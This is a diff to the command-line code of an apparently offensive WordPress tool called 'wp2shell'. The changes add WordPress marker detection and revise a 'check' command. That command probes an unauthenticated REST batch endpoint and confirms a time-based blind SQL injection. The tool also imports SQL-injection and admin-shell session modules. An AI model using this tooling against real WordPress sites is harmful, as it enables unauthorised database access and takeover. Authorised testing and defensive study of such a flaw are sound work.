@@ -11,7 +11,7 @@ from . import __version__
 from .client import BatchClient
 from .shell import AdminSession
 from .sqli import BlindSQLi
-from .version import public_version_hints, version_status
+from .version import public_version_hints, version_status, wordpress_markers
 
 try:
     import readline  # noqa: F401 - enables line editing/history for the interactive prompt
@@ -69,11 +69,20 @@ def _short(text: str, *, limit: int = 96) -> str:
     return text[: limit - 3] + "..."
 
 
-def _print_version_hints(client: BatchClient) -> None:
+def _print_wordpress_markers(client: BatchClient) -> tuple:
+    markers = wordpress_markers(client)
+    if markers:
+        info(f"WordPress markers found ({' / '.join(markers)})")
+    else:
+        warn("No public WordPress markers found.")
+    return markers
+
+
+def _print_version_hints(client: BatchClient) -> tuple:
     hints = public_version_hints(client)
     if not hints:
         warn("No public WordPress version hints found.")
-        return
+        return hints
 
     info("Public WordPress version hints:")
     for hint in hints:
@@ -83,6 +92,7 @@ def _print_version_hints(client: BatchClient) -> None:
         )
     if any(hint.affected for hint in hints):
         warn("A public version hint falls in the wp2shell affected range; verify internally or confirm with authorization.")
+    return hints
 
 
 # -- commands ---------------------------------------------------------------
@@ -96,12 +106,18 @@ def cmd_check(args: argparse.Namespace) -> int:
         rest_route=args.rest_route,
         proxy=args.proxy,
     )
-    probe = client.probe()
+    _print_wordpress_markers(client)
+    hints = _print_version_hints(client)
+
+    probe = client.marker_probe()
     if probe.status != 207:
         bad(f"Batch endpoint returned HTTP {probe.status} (not 207) — patched or REST API disabled.")
-        _print_version_hints(client)
         return 1
-    good("Batch endpoint reachable and unauthenticated (HTTP 207).")
+    markers = client.batch_marker_codes(probe)
+    if markers:
+        good(f"Batch probe -> HTTP 207; markers matched: {', '.join(markers)}")
+    else:
+        good("Batch endpoint reachable and unauthenticated (HTTP 207).")
 
     result = BlindSQLi(client, sleep=args.sleep).confirm_timing(samples=args.samples)
     if args.samples > 1:
@@ -112,10 +128,10 @@ def cmd_check(args: argparse.Namespace) -> int:
         info(f"Median delta {result.delta:.2f}s; threshold {result.threshold:.2f}s.")
     if result.confirmed:
         good(f"VULNERABLE — baseline {result.baseline:.2f}s, injected {result.delayed:.2f}s.")
-        _print_version_hints(client)
         return 0
-    bad(f"Not vulnerable — baseline {result.baseline:.2f}s, injected {result.delayed:.2f}s.")
-    _print_version_hints(client)
+    bad(f"Not timing-confirmed — baseline {result.baseline:.2f}s, injected {result.delayed:.2f}s.")
+    if any(hint.affected for hint in hints):
+        warn("Version suggests exposure, but the timing payload did not execute or was blocked.")
     return 2
 
 
